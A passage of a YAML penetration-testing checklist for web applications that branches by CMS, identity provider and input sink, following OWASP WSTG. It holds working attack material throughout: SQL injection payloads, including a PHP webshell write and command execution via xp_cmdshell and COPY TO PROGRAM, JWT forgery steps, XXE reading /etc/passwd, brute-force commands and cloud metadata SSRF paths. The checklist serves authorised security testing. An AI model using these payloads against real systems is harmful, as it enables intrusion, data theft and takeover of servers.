          - label: "Alibaba Cloud"
            key: "alibabacloud"
            children:
              - id: alibabacloud_checks
                type: checklist
                title: "Alibaba Cloud-specific checks"
                content: |
                  - OSS buckets: https://<bucket>.oss-<region>.aliyuncs.com (test anon read/list)
                  - Instance metadata via SSRF: http://100.100.100.200/latest/meta-data/
                    -> /latest/meta-data/ram/security-credentials/<role> (RAM STS credentials)
                  - Function Compute / API Gateway: unauthenticated endpoints, permissive CORS
          - label: "None / Self-hosted"
            key: "none"
            children: []

      # ---- Tech stack: CMS ------------------------------------------------
      - id: q_cms
        type: question
        title: "Does the application use a CMS?"
        options:
          - label: "WordPress"
            key: "wordpress"
            children:
              - id: wp_checks
                type: checklist
                title: "WordPress security checks"
                content: |
                  Automated scan:
                  - wpscan --url https://target.com --enumerate ap,at,u --api-token <token>

                  Manual checks:
                  - /wp-login.php: accessible? Password brute-force (lock-out policy?)
                  - /wp-admin/: redirect to login or accessible?
                  - /xmlrpc.php: enabled? Allows password brute-force in single request
                    POST with <methodName>wp.getUsersBlogs</methodName> + credentials list
                  - /wp-json/wp/v2/users: user enumeration via REST API
                  - /readme.html, /license.txt: version disclosure
                  - wp-config.php accessible? (should always 403)
                  - User enumeration: /?author=1 -> redirects to username
                  - Plugin / theme enumeration: check /wp-content/plugins/, /wp-content/themes/
                  - Outdated plugins with known CVEs (wpscan --enumerate ap)
                  - Debug mode: WP_DEBUG=true in wp-config.php -> error log at /wp-content/debug.log
          - label: "Drupal"
            key: "drupal"
            children:
              - id: drupal_checks
                type: checklist
                title: "Drupal security checks"
                content: |
                  - CHANGELOG.txt or INSTALL.txt: version disclosure
                  - /user/register: open registration?
                  - /admin/: accessible without auth?
                  - Drupalgeddon 2 (CVE-2018-7600): RCE — check if version < 7.58 or < 8.5.1
                  - Drupalgeddon 3 (CVE-2018-7602): check same versions
                  - droopescan scan drupal -u https://target.com
                  - /node/1, /node/2: enumerate content nodes
                  - REST API: /jsonapi/ or /rest/ — check for unauthenticated data access
          - label: "Joomla"
            key: "joomla"
            children:
              - id: joomla_checks
                type: checklist
                title: "Joomla security checks"
                content: |
                  - Version: /administrator/manifests/files/joomla.xml, /language/en-GB/en-GB.xml, README.txt
                  - Admin: /administrator/ — brute-force? default admin account?
                  - CVE-2023-23752: unauth API info leak -> DB creds via
                    /api/index.php/v1/config/application?public=true
                  - Component SQLi/LFI: enumerate ?option=com_* (com_fields, com_users, com_content)
                  - configuration.php exposure; /tmp and /logs paths
                  - Tools: joomscan, droopescan scan joomla -u https://target.com
          - label: "Magento / Adobe Commerce"
            key: "magento"
            children:
              - id: magento_checks
                type: checklist
                title: "Magento / Adobe Commerce security checks"
                content: |
                  - Version: /magento_version, /static/version*, cookie patterns
                  - Admin: /admin (custom path?); /downloader (Magento 1, legacy RCE)
                  - CVE-2022-24086/24087: unauth RCE via order/checkout template injection
                  - CVE-2024-34102 (CosmicSting): XXE -> RCE; CVE-2015-1397 (Shoplift) SQLi on M1
                  - REST API: /rest/V1/, /rest/all/V1/, integration tokens, guest-cart abuse
                  - GraphQL: /graphql introspection; customer/order IDOR
                  - Magecart: review checkout JS for skimmers
                  - Tools: magescan, nuclei -t magento/
          - label: "Adobe Experience Manager (AEM)"
            key: "aem"
            children:
              - id: aem_checks
                type: checklist
                title: "Adobe Experience Manager (AEM) security checks"
                content: |
                  - Dispatcher bypass to reach author/publish internals:
                    /content/page.html;%0aa.css, /path.json, /path.1.json, /path.infinity.json
                  - CRXDE Lite repository browser: /crx/de/index.jsp
                  - Felix OSGi console: /system/console/bundles (default admin:admin)
                    -> RCE via malicious bundle install
                  - /crx/explorer/, /etc.json, /home/users.json, default login /libs/granite/core/.../login.html
                  - GraphQL: /content/_cq_graphql, /graphql/execute.json
                  - SSRF: /libs/cq/contentsync, /bin/wcm, reporting proxies
                  - Tools: aem-hacker (aem_hacker.py -u https://target.com), nuclei -t aem/
          - label: "Sitecore"
            key: "sitecore"
            children:
              - id: sitecore_checks
                type: checklist
                title: "Sitecore security checks"
                content: |
                  - Admin/login: /sitecore/admin/, /sitecore/login — default admin / b
                  - CVE-2021-42237: unauth RCE via /sitecore/shell/ClientBin/Reporting/Report.ashx
                    (XAML deserialization)
                  - CVE-2023-35813: pre-auth RCE (Sitecore XP)
                  - Telerik handlers (Telerik.Web.UI.WebResource.axd) -> CVE-2019-18935 deserialization
                  - /sitecore/shell/, /sitecore/service/ exposure
                  - Verbose ASP.NET errors, web.config disclosure, machineKey -> ViewState forging
          - label: "Ghost"
            key: "ghost"
            children:
              - id: ghost_checks
                type: checklist
                title: "Ghost (Node CMS) security checks"
                content: |
                  - Version: meta generator tag, /ghost/api/admin/site/
                  - Admin panel: /ghost/ — brute-force / weak staff credentials
                  - Content API: /ghost/api/content/posts/?key=<content_api_key>
                    (the content key is often present in page-source JS)
                  - CVE-2023-32235: arbitrary file read (path traversal) on themed sites
                  - SSRF via "fetch from URL" / oembed / webhook features
                  - Members/Stripe signup abuse, newsletter injection
          - label: "TYPO3"
            key: "typo3"
            children:
              - id: typo3_checks
                type: checklist
                title: "TYPO3 security checks"
                content: |
                  - Backend: /typo3/; Install Tool: /typo3/install/ (FIRST_INSTALL, ENABLE_INSTALL_TOOL)
                  - Version: /typo3/sysext/core/, composer.json
                  - ?eID= handlers are pre-auth — enumerate for SQLi / unauth functionality
                  - CVE-2019-12747 deserialization; known TER extension vulns
                  - encryptionKey exposure -> forge cHash tokens
                  - fileadmin/ and typo3temp/ directory exposure
          - label: "Umbraco (.NET)"
            key: "umbraco"
            children:
              - id: umbraco_checks
                type: checklist
                title: "Umbraco (.NET CMS) security checks"
                content: |
                  - Backend: /umbraco, /umbraco/ping.aspx; version via login page / /umbraco/api/
                  - CVE-2020-29454 path traversal; authenticated RCE via Razor template/macro editing
                    if a low-priv user can reach it
                  - Exposed /App_Plugins/, ModelsBuilder, /umbraco/api/ endpoints
                  - web.config / machineKey disclosure -> ViewState deserialization (see .NET notes)
                  - Telerik handlers if bundled (CVE-2019-18935)
          - label: "None / Custom"
            key: "none"
            children: []

  # =========================================================================
  # WSTG-IDNT — IDENTITY MANAGEMENT
  # =========================================================================
  - id: wstg_idnt
    type: info
    title: "Identity Management (WSTG-IDNT)"
    content: "How identities are provisioned, named, and de-provisioned."
    children:
      - id: idnt_roles
        type: checklist
        title: "Map roles and provisioning (WSTG-IDNT-01)"
        content: |
          Understand the identity model before testing access control:
          - Enumerate the distinct roles / privilege levels (anonymous, user, staff, admin, super-admin)
          - How is a role assigned? Self-service, admin-approved, invite-only?
          - Can a low-privilege user influence their own role at provisioning time?
          - Are there service / machine accounts? How are they authenticated?
          - Record which features each role can reach — this feeds the Authorization section.

      - id: q_registration
        type: question
        title: "Can users self-register / create their own accounts?"
        options:
          - label: "Yes"
            key: "yes"
            children:
              - id: idnt_registration
                type: checklist
                title: "Test the registration process (WSTG-IDNT-02 / 03)"
                content: |
                  - Is registration open to anyone, or restricted (invite/domain allow-list)?
                  - Can you register privileged usernames (admin, root, system)?
                  - Mass-assignment at signup: add "role":"admin" / "isAdmin":true to the request
                  - Duplicate / collision: register an existing username with different casing
                    or trailing space ("admin", "Admin", "admin ") to collide with a real account
                  - Weak username policy: is there any uniqueness or format enforcement?
                  - Is email ownership verified before the account becomes usable?

              - id: idnt_email_variants
                type: checklist
                title: "Account takeover via identifier confusion (WSTG-IDNT-04)"
                content: |
                  Register variants of a victim's identifier and see if the app conflates them:
                  - Sub-addressing: victim+tag@target.com
                  - Dots / casing: VICTIM@target.com, vic.tim@gmail.com
                  - Unicode / homoglyph normalisation: victím@target.com
                  - Trailing whitespace or null byte: "victim@target.com "
                  - Overlong UTF-8 / punycode in the domain part
                  If a variant lands in the victim's account or a shared tenant -> ATO.
          - label: "No"
            key: "no"
            children: []

  # =========================================================================
  # WSTG-ATHN — AUTHENTICATION
  # =========================================================================
  - id: wstg_athn
    type: info
    title: "Authentication (WSTG-ATHN)"
    content: "How the application verifies identity. Answer the auth questions to load the right checks."
    children:
      - id: q_auth
        type: question
        title: "Does the target have authentication?"
        options:
          - label: "Yes"
            key: "yes"
            children:
              - id: q_auth_type
                type: question
                title: "What authentication mechanism is used?"
                options:
                  - label: "Homegrown (custom login form)"
                    key: "homegrown"
                    children:
                      - id: auth_homegrown_sqli
                        type: checklist
                        title: "Test login for SQL injection"
                        content: |
                          ' OR '1'='1, admin'-- , ' OR 1=1-- -
                          Use sqlmap: sqlmap -r login_request.txt --level=3 --risk=2
                          Check for blind SQLi via timing: ' OR SLEEP(5)--
                      - id: auth_homegrown_default_creds
                        type: checklist
                        title: "Test for default / weak credentials"
                        content: |
                          Common defaults: admin:admin, admin:password, admin:123456, root:root
                          test:test, guest:guest, admin:(blank), administrator:administrator
                          Check vendor documentation for product-specific defaults.
                          Hydra: hydra -L users.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
                  - label: "JWT"
                    key: "jwt"
                    children:
                      - id: auth_jwt_alg_none
                        type: checklist
                        title: "Test JWT algorithm confusion"
                        content: |
                          Algorithm none attack:
                          - Decode the JWT header, change "alg" to "none", remove signature
                          - jwt_tool.py <token> -X a

                          RS256 -> HS256 confusion:
                          - If server uses RS256, try signing with HS256 using the public key as secret
                          - jwt_tool.py <token> -X k -pk public.pem

                          Weak secret brute-force:
                          - hashcat -a 0 -m 16500 <jwt> /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
                          - jwt_tool.py <token> -C -d wordlist.txt
                      - id: auth_jwt_claims
                        type: checklist
                        title: "Test JWT claim manipulation"
                        content: |
                          - Decode and inspect all claims (sub, role, admin, exp, iss, aud)
                          - Change "role": "user" to "role": "admin", re-sign if secret known
                          - Check if exp is validated — set far future expiry
                          - Check if iss / aud are validated
                          - Try sending JWTs to other endpoints of the same service (cross-service reuse)
                          - jku / x5u header injection: point to attacker-hosted JWK Set
                  - label: "Keycloak"
                    key: "keycloak"
                    children:
                      - id: auth_keycloak_cves
                        type: checklist
                        title: "Check for known Keycloak CVEs"
                        content: |
                          Identify version via /auth/realms/master/.well-known/openid-configuration
                          Notable CVEs:
                          - CVE-2023-6927 (open redirect)
                          - CVE-2024-1132 (path traversal in redirect_uri)
                          - CVE-2023-0264 (user enumeration via login form)
                          - CVE-2022-4361 (XSS)
                          Search NVD: https://nvd.nist.gov/vuln/search?query=keycloak
                      - id: auth_keycloak_misconfig
                        type: checklist
                        title: "Check Keycloak misconfiguration"
                        content: |
                          - Is /auth/admin/ accessible from the internet? (default admin console)
                          - Are any realms configured with weak client secrets?
                          - Is implicit flow enabled? (deprecated, leaks tokens in URL)
                          - Is direct grant (password grant) enabled unnecessarily?
                          - Are token lifetimes unreasonably long (>1 hour for access tokens)?
                          - Is master realm used by the application (should use a dedicated realm)?
                  - label: "Authelia"
                    key: "authelia"
                    children:
                      - id: auth_authelia_bypass
                        type: checklist
                        title: "Test Authelia authentication bypass"
                        content: |
                          - Can backend services be reached by routing around the Authelia proxy?
                            Test direct IP / port access to upstream services
                          - Test access_control rules for gaps: missing paths, wrong prefixes
                          - Verify session cookies: Secure, HttpOnly, SameSite flags
                          - Test subdomain that shares session cookie domain
                          - Check for X-Forwarded-For / X-Remote-User / X-Auth-Request-User headers
                            being trusted from client
                  - label: "OAuth2 / OIDC"
                    key: "oauth2"
                    children:
                      - id: auth_oauth_state
                        type: checklist
                        title: "Test OAuth state parameter (CSRF)"
                        content: |
                          - Is state parameter present in authorization request?
                          - Is it cryptographically random (not guessable/predictable)?
                          - Is it validated server-side on the callback?
                          - Try replaying an old state value
                          - Try omitting the state parameter entirely
                          Missing/static state = CSRF against the OAuth flow -> account takeover
                      - id: auth_oauth_redirect
                        type: checklist
                        title: "Test redirect_uri validation"
                        content: |
                          Manipulate redirect_uri in the authorization request:
                          - Add a path: https://legit.com/callback/../../../attacker.com
                          - Add a parameter: https://legit.com/callback?next=https://attacker.com
                          - Use a different subdomain: https://sub.target.com/callback (if registered at domain level)
                          - Try open redirect chaining from the registered redirect_uri
                          - Test regex bypass: https://legit.com.attacker.com/callback
                      - id: auth_oauth_token_leak
                        type: checklist
                        title: "Test for token leakage and code reuse"
                        content: |
                          - Is the auth code sent in URL? Check Referer headers and server logs
                          - Is the access token in URL fragments? (implicit flow)
                          - Try reusing an auth code after it's been exchanged (should fail)
                          - Check if refresh tokens are properly rotated on use
                          - Is PKCE enforced for public clients?
                  - label: "SAML"
                    key: "saml"
                    children:
                      - id: auth_saml_signature
                        type: checklist
                        title: "Test SAML signature validation"
                        content: |
                          XML Signature Wrapping (XSW) attacks:
                          - Add a second unsigned assertion alongside the signed one
                          - Move the signed assertion into an extension element, replace the original
                          - Tools: SAMLRaider (Burp extension), saml-raider
                          - Remove the signature entirely — does the IDP still accept it?
                          - Try changing NameID / attributes after signature is generated
                      - id: auth_saml_xxe
                        type: checklist
                        title: "Test XXE in SAML assertions"
                        content: |
                          Inject XXE entities in the SAMLResponse (base64-decoded):
                          <?xml version="1.0"?>
                          <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                          Re-encode and send. If reflected, XXE is present.
                          Also test blind XXE with out-of-band callback (Burp Collaborator).
                  - label: "Okta"
                    key: "okta"
                    children:
                      - id: auth_okta
                        type: checklist
                        title: "Okta (IdP) security checks"
                        content: |
                          Okta fronts SSO via OIDC/SAML — also run the OAuth2/OIDC and SAML checks.
                          - Config: https://<org>.okta.com/.well-known/openid-configuration
                          - User/tenant enumeration: /api/v1/authn responses, primaryauth username probing,
                            login error differences
                          - redirect_uri validation on Okta-registered OIDC apps (wildcard/loose subpaths)
                          - Sign-on & MFA policies: is MFA truly enforced, or only for some apps/network zones?
                          - Self-service registration / JIT provisioning enabled -> rogue account creation
                          - API token (SSWS) exposed in JS/source -> full Org API access
                          - Classic vs Identity Engine (OIE): differing redirect / interaction-code flow bugs
                          - Open redirect via fromURI / RelayState on the Okta domain
                  - label: "Auth0"
                    key: "auth0"
                    children:
                      - id: auth_auth0
                        type: checklist
                        title: "Auth0 (IdP) security checks"
                        content: |
                          Auth0 is OIDC/OAuth2 — also run the OAuth2/OIDC checks.
                          - Tenant: https://<tenant>.<region>.auth0.com/.well-known/openid-configuration & /jwks.json
                          - callback/redirect_uri allow-list: loose entries, localhost, wildcard subpaths
                          - Token aud/iss validation on the app side; alg confusion (RS256->HS256)
                          - RBAC claims: are roles/permissions enforced server-side or tamperable?
                          - DB-connection signups: open signup -> account creation; weak password policy
                          - Management API token leakage in JS -> tenant takeover
                          - Rules/Actions logic flaws (custom claims, email-domain trust for privilege)
                          - Account-linking confusion (same email across social + DB connections)
                  - label: "Azure AD / Entra ID"
                    key: "entra"
                    children:
                      - id: auth_entra
                        type: checklist
                        title: "Azure AD / Entra ID (IdP) security checks"
                        content: |
                          Entra ID uses OIDC/SAML/WS-Fed — also run the OAuth2/OIDC and SAML checks.
                          - Multi-tenant confusion: if the app accepts /common or /organizations, can ANY
                            Microsoft tenant's user sign in? Verify tid (tenant) and iss are checked
                          - Token validation: aud=client_id, issuer, signing-key (kid); v1 vs v2 endpoint differences
                          - Tenant/user enumeration: login.microsoftonline.com/getuserrealm, /common/userrealm,
                            autodiscover; onmicrosoft.com domain discovery
                          - Consent phishing / over-privileged app registrations & delegated scopes
                          - Conditional Access bypass: legacy auth endpoints, device-code flow abuse
                          - reply-URL (redirect_uri) allow-list on the app registration
                          - SAML: golden SAML if the signing cert/key is compromised
                  - label: "AWS Cognito"
                    key: "cognito"
                    children:
                      - id: auth_cognito
                        type: checklist
                        title: "AWS Cognito security checks"
                        content: |
                          - Identity Pool (federated): is UNAUTHENTICATED access enabled? Grab a guest identity
                            -> temporary IAM creds -> enumerate the attached role (very common win):
                            aws cognito-identity get-id / get-credentials-for-identity --identity-pool-id ...
                          - User Pool id / app client id exposed in JS (us-east-1_xxxx, client id)
                          - Self sign-up enabled: cognito-idp sign-up -> create an account without invite
                          - Writable custom attributes -> mass-assignment of role/tenant (check client write perms)
                          - ADMIN_NO_SRP_AUTH flow if the app client is misconfigured
                          - Backend token validation: aud/client_id, token_use (id vs access), iss, exp
                          - Account enumeration via sign-up / forgot-password responses
                  - label: "Firebase Authentication"
                    key: "firebase_auth"
                    children:
                      - id: auth_firebase
                        type: checklist
                        title: "Firebase Authentication security checks"
                        content: |
                          - apiKey + projectId in client JS (public by design, but enables the endpoints below)
                          - Sign-up enabled: identitytoolkit.googleapis.com/v1/accounts:signUp?key=<apiKey>
                            -> create accounts; email enumeration via :createAuthUri
                          - Anonymous auth enabled -> get a token, then probe Firestore/RTDB rules
                          - Weak Security Rules: with an (anon) token, read/write Firestore & RTDB paths
                            (append /.json to the RTDB URL) — authz is the rules, so test them directly
                          - Email verification not enforced -> unverified accounts performing privileged actions
                          - Custom claims trusted without server-side re-check
                  - label: "Ping Identity (PingFederate / PingOne)"
                    key: "ping"
                    children:
                      - id: auth_ping
                        type: checklist
                        title: "Ping Identity security checks"
                        content: |
                          PingFederate/PingOne use OIDC/SAML/WS-Fed — also run OAuth2/OIDC and SAML checks.
                          - Metadata: /.well-known/openid-configuration, /pf/federation_metadata.ping, /idp/shibboleth
                          - redirect_uri / wreply / RelayState validation (open redirect & token theft)
                          - SAML assertion: signature wrapping (XSW), audience/recipient validation
                          - Fingerprint version -> check NVD for PingFederate/PingAccess CVEs
                          - SLO (single logout) and session fixation across federated apps
                  - label: "ADFS (on-prem Microsoft federation)"
                    key: "adfs"
                    children:
                      - id: auth_adfs
                        type: checklist
                        title: "ADFS security checks"
                        content: |
                          ADFS issues SAML/WS-Fed/OIDC — also run the SAML and OAuth2/OIDC checks.
                          - Endpoints: /adfs/ls/, /adfs/services/trust/,
                            /FederationMetadata/2007-06/FederationMetadata.xml
                          - Version & patch level via metadata + error pages (CVE-2018-8340 MFA bypass)
                          - Golden SAML: a compromised token-signing key forges assertions for any user
                          - wctx / RelayState / wreply open redirect & response replay
                          - Extranet lockout / password spray against /adfs/ls/ (often weak lockout)
                          - NTLM endpoint exposure (/adfs/services/trust/2005/windowstransport)
                  - label: "HTTP Basic / Digest auth"
                    key: "basic"
                    children:
                      - id: auth_basic
                        type: checklist
                        title: "HTTP Basic / Digest auth checks"
                        content: |
                          - Basic credentials are base64 (not encryption) — confirm TLS is enforced
                          - Brute-force / credential stuffing (Basic often has no lockout):
                            hydra -L users -P pass target.com http-get /protected
                          - Default creds on the protected resource (admin panels, /server-status)
                          - Is Basic auth applied consistently, or can some methods/paths skip it?
                            (e.g. only GET protected; proxy strips the realm on certain routes)
                          - Digest: check qop, nonce reuse/lifetime, algorithm (MD5-sess)
                          - Creds cached by browser/proxy; leak via Referer if placed in URL (user:pass@host)

              - id: auth_common
                type: info
                title: "Common Authentication Tests"
                content: "These apply regardless of the auth mechanism in use."
                children:
                  - id: auth_protection_check
                    type: checklist
                    title: "Assess authentication protection mechanisms"
                    content: |
                      Document what defences are in place — needed regardless of scope:
                      - Is there rate limiting on login attempts? How many before triggering?
                      - Is there account lockout? How many attempts? Temporary or permanent?
                      - Is CAPTCHA present on the login form?
                      - Does the app disclose whether an account exists via different error messages?

                  - id: auth_bruteforce
                    type: checklist
                    title: "Test brute-force and lockout bypass"
                    scope_tags: [brute_force]
                    content: |
                      Attempt to bypass the rate limiting and lockout controls identified above:
                      - Rotate source IPs via X-Forwarded-For / X-Real-IP / True-Client-IP
                      - Add X-Originating-IP, Forwarded: headers to appear as a new client
                      - Pad username with spaces ("admin ") to defeat per-account counters
                      - Use case variations ("Admin", "ADMIN") against case-insensitive stores
                      - CAPTCHA bypass: reuse a solved token, use audio CAPTCHA, or OCR tools

                  - id: auth_username_enum
                    type: checklist
                    title: "Test username enumeration"
                    content: |
                      Compare valid vs invalid usernames across:
                      - Response body text ("User not found" vs "Incorrect password")
                      - HTTP status codes (200 vs 401)
                      - Response time (database lookup timing)
                      - Registration: "that email is already registered"
                      - Password reset: "we sent an email" vs "no account found"
                      - Username enumeration + password spray = low-and-slow brute force

                  - id: auth_password_reset
                    type: checklist
                    title: "Test password reset flow"
                    content: |
                      - Is the reset token long, random, and single-use?
                      - Does it expire quickly (< 15 min recommended)?
                      - Can a reset token be reused after the password was changed?
                      - Is the old password invalidated immediately on reset?
                      - Host header injection: send reset with Host: attacker.com
                        -> does the email link point to attacker.com?
                      - Test parameter pollution: email=victim@target.com&email=attacker@evil.com
                      - Test if token is predictable (timestamp-based, sequential)
                      - Can you reset someone else's account by manipulating the reset request?

                  - id: auth_mfa
                    type: checklist
                    title: "Test multi-factor authentication"
                    content: |
                      - Can MFA be bypassed by skipping directly to post-MFA endpoints?
                      - Is the MFA code rate-limited? Brute-force 6-digit OTP if not
                      - Can a used OTP code be replayed (should be invalidated immediately)?
                      - Is MFA enforced on all sensitive actions (not just login)?
                      - Test account recovery / backup codes:
                        - Are backup codes single-use and revoked once used?
                        - Can they be brute-forced?
                      - Does the application expose a pre-2FA session that has partial access?
                      - Test SIM-swap / SMS interception risk (document if SMS-based)
          - label: "No"
            key: "no"
            children: []

  # =========================================================================
  # WSTG-ATHZ — AUTHORIZATION
  # =========================================================================
  - id: wstg_athz
    type: info
    title: "Authorization (WSTG-ATHZ)"
    content: "Test whether access controls are consistently enforced server-side."
    children:
      - id: authz_idor
        type: checklist
        title: "IDOR — Insecure Direct Object Reference (WSTG-ATHZ-04)"
        content: |
          This is the #1 bug bounty finding. Test every object reference.

          Find: IDs, GUIDs, usernames, email addresses, filenames in:
          - URL paths: /users/1234/profile
          - Query parameters: ?account_id=1234
          - POST/PUT body: {"user_id": 1234}
          - Headers: X-User-ID, X-Account
          - Cookies

          Test methodology:
          1. Create two test accounts (A and B)
          2. As A, perform actions and capture all object references
          3. As B, replay requests with A's object IDs
          4. Check: read, write, delete, update operations separately

          Common high-impact IDOR targets:
          - /api/users/{id}/export, /api/invoices/{id}, /api/orders/{id}
          - Password/email change endpoints with userId in body
          - File download endpoints
          - Admin actions that accept a userId parameter

      - id: authz_forced_browsing
        type: checklist
        title: "Forced browsing & missing function-level access control (WSTG-ATHZ-01)"
        content: |
          - Attempt to access restricted URLs directly (skip auth flows)
          - Map the app as an admin, then replay all requests as a regular user
          - Test: /admin, /admin/users, /admin/settings, /admin/export
          - Try accessing next steps in multi-step workflows out of order
          - Test if the app relies on URL obscurity rather than access checks
          - Check if removing auth cookies still allows access to "protected" pages
            (missing middleware, route exemptions)

      - id: q_multi_role
        type: question
        title: "Does the app have more than one privilege level / role?"
        options:
          - label: "Yes (e.g. user + admin)"
            key: "yes"
            children:
              - id: authz_privilege_escalation
                type: checklist
                title: "Vertical privilege escalation (WSTG-ATHZ-02)"
                content: |
                  - Map all role-specific functionality (admin panel, reporting, config)
                  - As a low-privilege user, attempt to call privileged endpoints directly
                  - Look for role / privilege / isAdmin parameters in requests — tamper them
                  - Test if simply possessing a higher-role JWT claim grants access
                  - Check if admin UI requests are purely client-side gated
                    (request still reaches the server — does the server enforce the role?)
                  - Test HTTP method differences: GET /admin/user may be allowed but PATCH is not
                  - Check GraphQL: is admin-only data exposed in the schema without access checks?
          - label: "No (single role)"
            key: "no"
            children: []

  # =========================================================================
  # WSTG-SESS — SESSION MANAGEMENT
  # =========================================================================
  - id: wstg_sess
    type: info
    title: "Session Management (WSTG-SESS)"
    content: "How sessions are created, maintained, and destroyed."
    children:
      - id: auth_session_flags
        type: checklist
        title: "Check session cookie flags (WSTG-SESS-02)"
        content: |
          Every session cookie must have:
          - Secure — only sent over HTTPS
          - HttpOnly — not accessible via JavaScript
          - SameSite=Strict or Lax — CSRF protection
          Check in browser DevTools -> Application -> Cookies
          or: curl -s -I https://target.com/login | grep -i set-cookie

      - id: auth_session_fixation
        type: checklist
        title: "Test session fixation (WSTG-SESS-03)"
        content: |
          1. Obtain a session token without authenticating (GET /login)
          2. Authenticate using that session token
          3. Check if the session ID changes post-authentication
          If the pre-auth session ID is still valid post-login -> session fixation.

      - id: auth_session_timeout
        type: checklist
        title: "Test session timeout and logout (WSTG-SESS-06 / 07)"
        content: |
          - Is there an idle session timeout?
          - Is there an absolute maximum session lifetime?
          - After logout, is the server-side session invalidated?
            (Test: copy session cookie before logout, attempt to use it after)
          - Is there a "remember me" token? Is it revocable server-side?
          - Are all sessions terminated when the user changes their password?

      - id: sess_csrf
        type: checklist
        title: "Cross-Site Request Forgery — CSRF (WSTG-SESS-05)"
        content: |
          Test all state-changing requests for CSRF protection.

          Is a CSRF token present?
          - In a hidden form field
          - In a custom header (X-CSRF-Token, X-Requested-With)

          Is the token validated?
          - Remove the token entirely — does the request succeed?
          - Use an empty token / arbitrary value
          - Use another user's valid token (should be user-specific)
          - Reuse the same token for multiple requests

          SameSite cookie bypass scenarios:
          - Is SameSite=None with Secure set? (allows cross-site)
          - Top-level navigation bypass (SameSite=Lax): GET requests that change state

          JSON CSRF (no CSRF token):
          - Can the Content-Type be changed to text/plain while keeping JSON body?
          - Flash-based request (legacy)

  # =========================================================================
  # WSTG-INPV — INPUT VALIDATION  (question-driven: pick the sinks that exist)
  # =========================================================================
  - id: wstg_inpv
    type: info
    title: "Input Validation (WSTG-INPV)"
    content: |
      Most high-impact bugs live here. Rather than running every injection check,
      answer the questions below about how the app actually processes input — each
      "Yes" spawns the specific tests for that sink. Test every user-controllable
      input: form fields, URL/query params, path segments, JSON keys, headers, cookies.
    children:
      - id: q_inpv_html
        type: question
        title: "Does the app reflect or store user input that is later rendered as HTML?"
        options:
          - label: "Yes"
            key: "yes"
            children:
              - id: injection_xss
                type: checklist
                title: "Cross-Site Scripting — XSS (WSTG-INPV-01 / 02)"
                content: |
                  Test all inputs: form fields, URL params, path segments, headers, cookies.

                  Reflected XSS:
                  - <script>alert(document.domain)</script>
                  - <img src=x onerror=alert(1)>
                  - "><svg onload=alert(1)>
                  - javascript:alert(1) in href/src attributes

                  Stored XSS (high impact):
                  - Profile fields, comments, messages, file names, custom labels
                  - Admin-visible content submitted by users is especially valuable

                  DOM XSS — check JS sinks:
                  - document.write(), innerHTML, outerHTML, insertAdjacentHTML
                  - location.href, eval(), setTimeout/setInterval with string
                  - jQuery: .html(), .append() with unsanitized input
                  - Grep JS for: location.hash, document.referrer, location.search
                  Tools: DalFox, XSStrike, kxss

                  Blind XSS (fires in admin panel / backend):
                  - Set up XSS Hunter (xsshunter.trufflesecurity.com)
                  - Inject payload in every input that might reach an internal user
                  - Log user-agent, form fields, feedback forms, ticket systems
          - label: "No"
            key: "no"
            children: []

      - id: q_inpv_db
        type: question
        title: "Does the app build database queries (SQL / NoSQL) from user input?"
        options:
          - label: "Yes"
            key: "yes"
            children:
              - id: injection_sqli
                type: checklist
                title: "SQL / NoSQL Injection (WSTG-INPV-05)"
                content: |
                  Test every parameter that may feed a database query.

                  Detection:
                  - Single quote: ' -> does it cause a 500 / error?
                  - Boolean: ' AND 1=1-- - vs ' AND 1=2-- - (different response?)
                  - Time-based (blind): ' AND SLEEP(5)-- - (MySQL) / ' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- - (Postgres)

                  Manual exploitation:
                  - Union: ' UNION SELECT NULL,NULL,NULL-- -  (adjust columns until no error)
                  - Error-based: ' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -

                  Automation:
                  - sqlmap -r request.txt --level=3 --risk=2 --dbs
                  - sqlmap -u "https://target.com/page?id=1" --batch --crawl=2

                  NoSQL injection (MongoDB):
                  - {"username": {"$ne": null}, "password": {"$ne": null}}
                  - username[$ne]=x&password[$ne]=y (URL-encoded form)
                  - {"$where": "sleep(5000)"}

              - id: q_db_engine
                type: question
                title: "Which database engine backs it (for targeted exploitation)?"
                options:
                  - label: "PostgreSQL"
                    key: "postgres"
                    children:
                      - id: sqli_postgres
                        type: checklist
                        title: "PostgreSQL injection specifics"
                        content: |
                          - Version: SELECT version();  string concat with || (not +)
                          - Stacked queries supported by many drivers: ; DROP ... / ; SELECT ...
                          - Time-based: ; SELECT pg_sleep(5)--  or  AND 1=(SELECT 1 FROM pg_sleep(5))
                          - Error-based: AND 1=CAST((SELECT version()) AS int)--
                          - Cast everything to text: (SELECT string_agg(table_name,',') FROM information_schema.tables)::text
                          - File read: SELECT pg_read_file('/etc/passwd');  (needs privs)
                          - RCE: COPY (SELECT '') TO PROGRAM 'id';  (superuser) or CREATE ... COPY FROM PROGRAM
                          - Large objects (lo_import/lo_export) to read/write files
                          - sqlmap --dbms=postgresql
                  - label: "MySQL / MariaDB"
                    key: "mysql"
                    children:
                      - id: sqli_mysql
                        type: checklist
                        title: "MySQL / MariaDB injection specifics"
                        content: |
                          - Version: SELECT @@version;  comments: -- - , #, /*!50000 ... */ (version-gated)
                          - UNION: ' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -
                          - Time-based: ' AND SLEEP(5)-- -  or  ' OR IF(1=1,SLEEP(5),0)-- -
                          - Error-based: AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
                            or updatexml(1,concat(0x7e,(SELECT user())),1)
                          - File read: SELECT LOAD_FILE('/etc/passwd');  (FILE priv + secure_file_priv)
                          - Webshell write: ' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/s.php'-- -
                          - Usually NO stacked queries via mysqli/PDO single-statement APIs
                          - sqlmap --dbms=mysql
                  - label: "Microsoft SQL Server"
                    key: "mssql"
                    children:
                      - id: sqli_mssql
                        type: checklist
                        title: "MSSQL injection specifics"
                        content: |
                          - Version: SELECT @@version;  string concat with + ;  comment --
                          - Stacked queries fully supported: '; <stmt>--
                          - Time-based: '; WAITFOR DELAY '0:0:5'--
                          - Error-based: ' AND 1=CONVERT(int,(SELECT @@version))--
                          - RCE: EXEC xp_cmdshell 'whoami';  (enable via sp_configure if off)
